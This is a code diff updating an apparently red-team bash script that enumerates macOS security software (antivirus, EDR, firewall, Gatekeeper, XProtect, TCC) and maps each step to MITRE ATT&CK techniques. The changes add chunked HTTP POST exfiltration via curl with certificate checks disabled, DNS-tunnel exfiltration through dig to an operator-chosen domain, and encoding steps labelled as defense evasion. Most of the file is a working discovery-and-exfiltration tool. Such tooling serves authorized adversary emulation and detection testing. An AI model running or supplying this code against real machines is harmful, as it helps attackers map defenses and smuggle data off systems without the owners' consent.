@@ -8,33 +8,15 @@
 # Permissions Required: User
 # Author: @darmado x.com/darmad0
 # Date: 2024-09-23
-# Version: 1.1
+# Version: 1.4
 
 # Description: This script discovers security software installed on a macOS system,
 # including antivirus, firewall, and other security tools. It checks for running
 # proc, installed applications, and system configurations related to security
 # software.
-
+#
 # Usage: ./security_software.sh [options]
-# Options:
-#   --help                 Display this help message
-#   --verbose              Enable verbose output
-#   --log                  Enable logging of output to a file
-#   --all                  Run all security software checks
-#   --edr=OPTION           Check specific EDR component (ps|files|config)
-#   --fw             Check firewall status
-#   --hids                 Check for HIDS
-#   --av=OPTION     Check specific antivirus component (ps|files|config)
-#   --gk           Check Gatekeeper status
-#   --xp             Check XProtect status
-#   --mrt=OPTION           Check specific MRT component (ps|files|config)
-#   --tcc                  Check TCC (Transparency, Consent, and Control) status
-#   --ost=OPTION Check specific opensource security tool components (ps|files|info)
-#   --encode=TYPE          Encode output (b64|hex)
-#   --encrypt=METHOD       Encrypt output (aes-256-cbc, bf, etc.). Generates a random key.
-#   --exfil=URI            Exfiltrate output to URI using HTTP POST
-#   --exfil=dns=DOMAIN     Exfiltrate output via DNS queries to DOMAIN
-#   --sudo                 Enable sudo mode for operations requiring elevated privileges
+
 
 # Note: This script is intended for educational and authorized testing purposes only.
 # Ensure you have proper permissions before running on any system.
@@ -42,6 +24,7 @@
 # Global variables
 NAME="security_software"
 TTP_ID="T1518.001"
+TACTIC="Discovery"
 LOG_FILE="${TTP_ID}_${NAME}.log"
 VERBOSE=false
 LOG_ENABLED=false
@@ -52,17 +35,39 @@ EXFIL_URI=""
 ENCRYPT="none"
 ENCRYPT_KEY=""
 ALL=false
-EDR_CHECK=""
-AV_CHECK=""
-MRT_CHECK=""
+EDR=""
+AV=""
+MRT=""
 FIREWALL=false
 HIDS=false
 GATEKEEPER=false
 XPROTECT=false
 TCC=false
 SUDO_MODE=false
+CHUNK_SIZE=1000  # Default chunk size
 
-# Command variables
+# MITRE ATT&CK Mappings
+TACTIC="Discovery"
+TTP_ID="T1518.001"
+
+TACTIC_EXFIL="Exfiltration"
+TTP_ID_EXFIL="T1041"
+
+TACTIC_ENCRYPT="Defense Evasion"
+TTP_ID_ENCRYPT="T1027"
+
+TACTIC_ENCODE="Defense Evasion"
+TTP_ID_ENCODE="T1140"
+
+TTP_ID_ENCODE_BASE64="T1027.001"
+TTP_ID_ENCODE_STEGANOGRAPHY="T1027.003"
+TTP_ID_ENCODE_PERL="T1059.006"
+
+CMD_LS_APP_FILES='ls -laR /Applications/'
+CMD_LS_APP_DIR='ls -d /Applications/'
+CMD_PS='ps -axrww | grep -v grep| grep --color=always'
+CMD_SP_APP='system_profiler SPApplicationsDataType | grep --color=always -A 8 '
+
 CMD_LS_APP_FILES='ls -laR /Applications/'
 CMD_LS_APP_DIR='ls -d /Applications/'
 CMD_PS='ps -axrww | grep -v grep| grep --color=always'
@@ -76,11 +81,11 @@ OST=()
 
 
 cmd_ls_app_files() {
-    $CMD_LS_APP_FILES"$1" 2>/dev/null
+    "$CMD_LS_APP_FILES""$1" 2>/dev/null
 }
 
 cmd_ls_app_dir() {
-   $CMD_LS_APP_DIR"$1" 2>/dev/null
+   "$CMD_LS_APP_DIR""$1" 2>/dev/null
 }
 
 #TODO: i dont like  this is eval, but it works for now
@@ -98,7 +103,7 @@ AV_VENDOR_PROC=(
     "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
     "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
     "Avast:AvastUI"
-    "AvastBusinessAntivirus:AvastBusinessUI"
+    "AvastBusinessAntivirusforMac:AvastBusinessUI"
     "AvastFreeAntivirusforMac:AvastFreeUI"
     "AvastSecurity:AvastSecurityUI"
     "Avira:AviraUI"
@@ -241,51 +246,72 @@ display_help() {
     echo ""
     echo "  Data Exfiltration:"
     echo "    --exfil=URI            Exfil via HTTP POST using curl (RFC 7231)"
-    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig, splits data into chunks (RFC 1035)"
+    echo "    --exfil=dns=DOMAIN     Exfil via DNS TXT queries using dig (RFC 1035)"
+    echo "    --chunksize=SIZE       Set the chunk size for HTTP exfiltration (100-10000 bytes, default 1000)"
+    echo "                           Note: DNS exfiltration uses fixed 63-byte chunks per RFC 1035"
 }
-check_antivirus() {
+
+get_timestamp() {
+    date +"%Y-%m-%d %H:%M:%S"
+}
+
+log_to_stdout() {
+    local msg="$1"
+    local function_name="$2"
+    local command="$3"
+    local timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+    local log_entry="[${timestamp}]: user: $USER; ttp_id: $TTP_ID; tactic: $TACTIC; msg: $msg; function: $function_name; command: \"$command\""
+    
+    echo "$log_entry"
+    
+    if [ "$LOG_ENABLED" = true ]; then
+        echo "$log_entry" >> "$LOG_FILE"
+    fi
+}
+
+check_av() {
     local check_type="$1"
     local output=""
 
     case "$check_type" in
         "ps")
-            output+="Process Check:\n"
+            log_to_stdout "Checked antivirus processes" "check_av" "$CMD_PS"
             for entry in "${AV_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
                     result=$(cmd_ps "$proc")
                     if [ -n "$result" ]; then
-                        output+="$result\n"
+                        output+="$result"$'\n'
                     fi
                 done
             done
             ;;
         "files")
-            output+="Files Check:\n"
+            log_to_stdout "Checked antivirus files" "check_av" "$CMD_LS_APP_FILES"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_files "$app_name")
                 if [ -n "$result" ]; then
-                    output+="$result\n"
+                    output+="$result"$'\n'
                 fi
             done
             ;;
         "dir")
-            output+="Directory Check:\n"
+            log_to_stdout "Checked antivirus directories" "check_av" "$CMD_LS_APP_DIR"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$app_name")
                 if [ -n "$result" ]; then
-                    output+="$result\n"
+                    output+="$result"$'\n'
                 fi
             done
             ;;
         "info")
-            output+="Info Check:\n"
+            log_to_stdout "Checked antivirus info" "check_av" "$CMD_SP_APP"
             for app_name in "${AV_VENDOR_APP[@]}"; do
                 if app_path=$(cmd_ls_app_dir "$app_name"); then
                     app_name_colon="${app_name/.app/:}"
                     result=$(cmd_sp_app "$app_name_colon")
                     if [ -n "$result" ]; then
-                        output+="$result\n"
+                        output+="$result"$'\n'
                     fi
                 fi
             done
@@ -304,6 +330,7 @@ check_edr() {
 
     case "$check_type" in
         "ps")
+            log_to_stdout "Checked EDR processes" "check_edr" "$CMD_PS"
             for entry in "${EDR_VENDOR_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
@@ -315,6 +342,7 @@ check_edr() {
             done
             ;;
         "files")
+            log_to_stdout "Checked EDR files" "check_edr" "$CMD_LS_APP_FILES"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_files "$edr_name")
                 if [ -n "$result" ]; then
@@ -323,6 +351,7 @@ check_edr() {
             done
             ;;
         "dir")
+            log_to_stdout "Checked EDR directories" "check_edr" "$CMD_LS_APP_DIR"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$edr_name")
                 if [ -n "$result" ]; then
@@ -331,6 +360,7 @@ check_edr() {
             done
             ;;
         "info")
+            log_to_stdout "Checked EDR info" "check_edr" "$CMD_SP_APP"
             for edr_name in "${EDR_VENDOR_APP[@]}"; do
                 if cmd_ls_app_dir "$edr_name" > /dev/null 2>&1; then
                     edr_name_colon="${edr_name/.app/:}"
@@ -355,6 +385,7 @@ check_ost() {
 
     case "$check_type" in
         "ps")
+            log_to_stdout "Checked OST processes" "check_ost" "$CMD_PS"
             for entry in "${OST_PROC[@]}"; do
                 procs="${entry#*:}"
                 for proc in ${procs//,/ }; do
@@ -366,6 +397,7 @@ check_ost() {
             done
             ;;
         "files")
+            log_to_stdout "Checked OST files" "check_ost" "$CMD_LS_APP_FILES"
             for ost_name in "${OST_APP[@]}"; do
                 result=$(cmd_ls_app_files "$ost_name")
                 if [ -n "$result" ]; then
@@ -374,6 +406,7 @@ check_ost() {
             done
             ;;
         "dir")
+            log_to_stdout "Checked OST directories" "check_ost" "$CMD_LS_APP_DIR"
             for ost_name in "${OST_APP[@]}"; do
                 result=$(cmd_ls_app_dir "$ost_name")
                 if [ -n "$result" ]; then
@@ -382,6 +415,8 @@ check_ost() {
             done
             ;;
         "info")
+            log_to_stdout "Checking OST info" "check_ost" "$CMD_SP_APP"
+            
             for ost_name in "${OST_APP[@]}"; do
                 if cmd_ls_app_dir "$ost_name" > /dev/null 2>&1; then
                     ost_name_colon="${ost_name/.app/:}"
@@ -402,85 +437,145 @@ check_ost() {
 
 # Encoding function
 encode_output() {
-    local output=$1
+    local data="$1"
+    local original_ttp_id=$TTP_ID
+    local original_tactic=$TACTIC
+
     case $ENCODE in
-        b64|base64)
+        b64)
+            TTP_ID=$TTP_ID_ENCODE_BASE64
+            TACTIC=$TACTIC_ENCODE
+            log_to_stdout "Encoded output using Base64" "encode_output" "base64"
             echo "$output" | base64
             ;;
         hex)
+            TTP_ID=$TTP_ID_ENCODE
+            TACTIC=$TACTIC_ENCODE
+            log_to_stdout "Encoded output using Hex" "encode_output" "xxd -p"
             echo "$output" | xxd -p
             ;;
-        uuencode)
-            echo "$output" | uuencode -m -
-            ;;
         perl_b64)
-            echo "$output" | perl -e 'use MIME::Base64; print encode_base64(join("", <STDIN>));'
+            TTP_ID=$TTP_ID_ENCODE_PERL
+            TACTIC="Execution"
+            log_to_stdout "Encoded output using Perl Base64" "encode_output" "perl -MMIME::Base64 -e 'print encode_base64(\"$output\");'"
+            perl -MMIME::Base64 -e "print encode_base64(\"$output\");"
             ;;
         perl_utf8)
-            echo "$output" | perl -e 'use Encode qw(encode); print encode("utf8", join("", <STDIN>));'
+            TTP_ID=$TTP_ID_ENCODE_PERL
+            TACTIC="Execution"
+            log_to_stdout "Encoded output using Perl UTF-8" "encode_output" "perl -e 'print \"$output\".encode(\"UTF-8\");'"
+            perl -e "print \"$output\".encode(\"UTF-8\");"
             ;;
         *)
-            echo "$output"
+            echo "Unknown encoding type: $ENCODE" >&2
+            return 1
             ;;
     esac
+
+    TTP_ID=$original_ttp_id
+    TACTIC=$original_tactic
+}
+
+validate_dns() {
+    local domain="$1"
+    if host "$domain" > /dev/null 2>&1; then
+        return 0
+    else
+        return 1
+    fi
+}
+
+chunk_data() {
+    local data="$1"
+    local chunk_size="$2"
+    local output=""
+    
+    while [ -n "$data" ]; do
+        output+="${data:0:$chunk_size}"$'\n'
+        data="${data:$chunk_size}"
+    done
+    
+    echo "$output"
 }
 
 exfiltrate_http() {
     local data="$1"
-    local uri="$2"
-    if [ -z "$data" ]; then
-        echo "No data to exfiltrate" >&2
-        return 1
-    fi
-    if [ "$ENCRYPT" != "none" ]; then
-        data=$(encrypt_data "$data" "$ENCRYPT" "$ENCRYPT_KEY")
-        encoded_key=$(echo "$ENCRYPT_KEY" | base64 | tr '+/' '-_' | tr -d '=')
-    fi
-    encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
+    local url="$2"
+    local og_ttp="$TTP_ID"
+    TTP_ID="$TTP_ID_EXFIL"
+
+    log_to_stdout "Starting HTTP exfil" "exfil_http" "curl $url"
     
-    # Determine if we're using HTTPS
-    if [[ "$uri" == https://* ]]; then
-        curl_opts="--insecure"
-    else
-        curl_opts=""
-    fi
-    
-    local full_uri="$uri?d=$encoded_data"
-    if [ "$ENCRYPT" != "none" ]; then
-        full_uri="${full_uri}&_k=$encoded_key"
-    fi
-    
-    if [ "$VERBOSE" = true ]; then
-        echo "Exfiltrating data to $uri"
-        curl -v $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri"
-    else
-        curl -s $curl_opts -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15" "$full_uri" > /dev/null 2>&1
-    fi
+    local chunks=$(chunk_data "$data" "$CHUNK_SIZE")
+    local total=$(echo "$chunks" | wc -l)
+    local count=1
+
+    echo "$chunks" | while IFS= read -r chunk; do
+        local size=${#chunk}
+        log_to_stdout "Sending chunk $count/$total ($size bytes)" "exfil_http" "curl $url"
+        
+        if curl -L -s -X POST -d "$chunk" "$url" --insecure -o /dev/null -w "%{http_code}" | grep -q "^2"; then
+            log_to_stdout "Chunk $count/$total sent" "exfil_http" "curl $url"
+        else
+            log_to_stdout "Chunk $count/$total failed" "exfil_http" "curl $url"
+            TTP_ID="$og_ttp"
+            return 1
+        fi
+        count=$((count + 1))
+    done
+
+    log_to_stdout "HTTP exfil complete" "exfil_http" "curl $url"
+    TTP_ID="$og_ttp"
+    return 0
 }
 
 exfiltrate_dns() {
-    local data=$1
-    local domain=$2
-    local id=$3
+    local data="$1"
+    local domain="$2"
+    local id="$3"
+    local original_ttp_id=$TTP_ID
+    TTP_ID=$TTP_ID_EXFIL
+
     local encoded_data=$(echo "$data" | base64 | tr '+/' '-_' | tr -d '=')
     local encoded_id=$(echo "$id" | base64 | tr '+/' '-_' | tr -d '=')
-    local chunk_size=63  # Max length of a DNS label
+    local dns_chunk_size=63  # Fixed max length of a DNS label
+
+    log_to_stdout "Attempting to exfiltrate data via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
 
     # Send the ID first
-    dig +short "${encoded_id}.id.$domain" A > /dev/null
+    if ! dig +short "${encoded_id}.id.$domain" A > /dev/null; then
+        log_to_stdout "Failed to send ID via DNS" "exfiltrate_dns" "dig +short ${encoded_id}.id.$domain"
+        TTP_ID=$original_ttp_id
+        return 1
+    fi
 
-    # Then send the data in chunks
-    local i=0
-    while [ -n "$encoded_data" ]; do
-        chunk="${encoded_data:0:$chunk_size}"
-        encoded_data="${encoded_data:$chunk_size}"
-        dig +short "${chunk}.${i}.$domain" A > /dev/null
-        i=$((i+1))
+    local chunks=$(chunk_data "$encoded_data" "$dns_chunk_size")
+    local total_chunks=$(echo "$chunks" | wc -l)
+    local chunk_num=0
+
+    echo "$chunks" | while IFS= read -r chunk; do
+        if dig +short "${chunk}.${chunk_num}.$domain" A > /dev/null; then
+            log_to_stdout "Successfully sent chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+        else
+            log_to_stdout "Failed to send chunk $((chunk_num+1))/$total_chunks via DNS" "exfiltrate_dns" "dig +short ${chunk}.${chunk_num}.$domain"
+            TTP_ID=$original_ttp_id
+            return 1
+        fi
+        chunk_num=$((chunk_num+1))
     done
-    # Send a final chunk to indicate end of transmission
-    dig +short "end.$domain" A > /dev/null
+
+    if dig +short "end.$domain" A > /dev/null; then
+        log_to_stdout "Successfully completed DNS exfiltration" "exfiltrate_dns" "dig +short end.$domain"
+        TTP_ID=$original_ttp_id
+        return 0
+    else
+        log_to_stdout "Failed to send end signal via DNS" "exfiltrate_dns" "dig +short end.$domain"
+        TTP_ID=$original_ttp_id
+        return 1
+    fi
 }
 
+#TODO: I comletely forgot about this function and it needs to be tested.
 setup_log() {
     local script_name=$(basename "$0" .sh)
     touch "$LOG_FILE"
@@ -522,18 +617,34 @@ while [ "$#" -gt 0 ]; do
         --verbose) VERBOSE=true ;;
         --log) LOG_ENABLED=true ;;
         --all) ALL=true ;;
-        --edr=*) EDR_CHECK="${1#*=}" ;;
+        --edr=*) EDR="${1#*=}" ;;
         --fw) FIREWALL=true ;;
         --hids) HIDS=true ;;
         --av=*) AV+=("${1#*=}") ;;
         --gk) GATEKEEPER=true ;;
         --xp) XPROTECT=true ;;
-        --mrt=*) MRT_CHECK="${1#*=}" ;;
+        --mrt=*) MRT="${1#*=}" ;;
         --tcc) TCC=true ;;
         --ost=*) OST+=("${1#*=}") ;;
         --encode=*) ENCODE="${1#*=}" ;;
         --encrypt=*) ENCRYPT="${1#*=}"; ENCRYPT_KEY=$(openssl rand -base64 32 | tr -d '\n/') ;;
-        --exfil=*) EXFIL=true; EXFIL_METHOD="${1#*=}"; EXFIL_URI="${1#*=dns=}" ;;
+        --exfil=*) 
+            EXFIL=true
+            EXFIL_METHOD="${1#*=}"
+            if [[ "$EXFIL_METHOD" == dns=* ]]; then
+                EXFIL_URI="${EXFIL_METHOD#dns=}"
+            else
+                EXFIL_URI="$EXFIL_METHOD"
+            fi
+            ;;
+        --chunksize=*)
+            CHUNK_SIZE="${1#*=}"
+            # Ensure chunk size is within acceptable limits (e.g., 100 to 10000 bytes)
+            if [ "$CHUNK_SIZE" -lt 100 ] || [ "$CHUNK_SIZE" -gt 10000 ]; then
+                echo "Error: Chunk size must be between 100 and 10000 bytes" >&2
+                exit 1
+            fi
+            ;;
         --sudo) SUDO_MODE=true ;;
         *) echo "Unknown option: $1" >&2; display_help; exit 1 ;;
     esac
@@ -542,34 +653,105 @@ done
 
 main() {
     local output=""
-    local separator=$'\n---\n'
+    local encoded_output=""
+    if [ "$LOG_ENABLED" = true ]; then
+        setup_log
+    fi
 
-    if [ "$ALL" = true ] || [ ${#EDR[@]} -gt 0 ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
-       [ ${#MRT[@]} -gt 0 ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
-       [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ]; then
+    # Validate DNS early if exfiltration is requested
+    if [ "$EXFIL" = true ]; then
+        local domain
+        if [[ "$EXFIL_METHOD" == http://* ]]; then
+            domain=$(echo "$EXFIL_METHOD" | awk -F[/:] '{print $4}')
+        elif [[ "$EXFIL_METHOD" == dns=* ]]; then
+            domain="${EXFIL_METHOD#dns=}"
+        else
+            log_to_stdout "Unknown exfiltration method: $EXFIL_METHOD" "main" "validate_dns"
+            exit 1
+        fi
+
+        if ! validate_dns "$domain"; then
+            log_to_stdout "DNS resolution failed for $domain, exiting" "main" "validate_dns"
+            exit 1
+        fi
+    fi
+
+    # Run TTPs only if DNS validation passed or exfiltration is not requested
+    if [ "$ALL" = true ] || [ -n "${EDR[*]}" ] || [ ${#AV[@]} -gt 0 ] || [ "$FIREWALL" = true ] || 
+       [ -n "${MRT[*]}" ] || [ "$GATEKEEPER" = true ] || [ "$XPROTECT" = true ] || 
+       [ "$TCC" = true ] || [ ${#OST[@]} -gt 0 ] || [ "$LOG_ENABLED" = true ]; then
         
-        local av_output=""
         for av_tool in "${AV[@]}"; do
-            av_output+="${separator}Antivirus Check ($av_tool):${separator}"
-            av_output+=$(check_antivirus "$av_tool")
+            result=$(check_av "$av_tool")
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
-        output+="$av_output"
 
-        local ost_output=""
         for ost_tool in "${OST[@]}"; do
-            ost_output+="${separator}OST Check ($ost_tool):${separator}"
-            ost_output+=$(check_ost "$ost_tool")
+            result=$(check_ost "$ost_tool")
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
         done
-        output+="$ost_output"
 
-        # ... (similar changes for other checks)
+        for edr_tool in "${EDR[@]}"; do
+            result=$(check_edr "$edr_tool")
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        done
+
+        if [ "$FIREWALL" = true ]; then
+            result=$(check_firewall)
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        fi
+
+        for mrt_tool in "${MRT[@]}"; do
+            result=$(check_mrt "$mrt_tool")
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        done
+
+        if [ "$GATEKEEPER" = true ]; then
+            result=$(check_gatekeeper)
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        fi
+
+        if [ "$XPROTECT" = true ]; then
+            result=$(check_xprotect)
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        fi
+
+        if [ "$TCC" = true ]; then
+            result=$(check_tcc)
+            output+="$result"$'\n'
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$result" >> "$LOG_FILE"
+        fi
     else
         display_help
         exit 0
     fi
 
     if [ -n "$output" ]; then
-        echo "$output"
+        if [ "$ENCODE" != "none" ]; then
+            encoded_output=$(encode_output "$output")
+            echo "$encoded_output"
+            [ "$LOG_ENABLED" = true ] && [ "$EXFIL" != true ] && echo "$encoded_output" >> "$LOG_FILE"
+        else
+            echo "$output"
+        fi
+
+        if [ "$EXFIL" = true ]; then
+            local exfil_data=$([ "$ENCODE" != "none" ] && echo "$encoded_output" || echo "$output")
+            local b64_output=$(echo "$exfil_data" | base64)
+            if [[ "$EXFIL_METHOD" == http://* ]]; then
+                exfiltrate_http "$b64_output" "$EXFIL_METHOD"
+            elif [[ "$EXFIL_METHOD" == dns=* ]]; then
+                local domain="${EXFIL_METHOD#dns=}"
+                exfiltrate_dns "$b64_output" "$domain" "$(date +%s)"
+            fi
+        fi
     else
         echo "No security software information found"
     fi
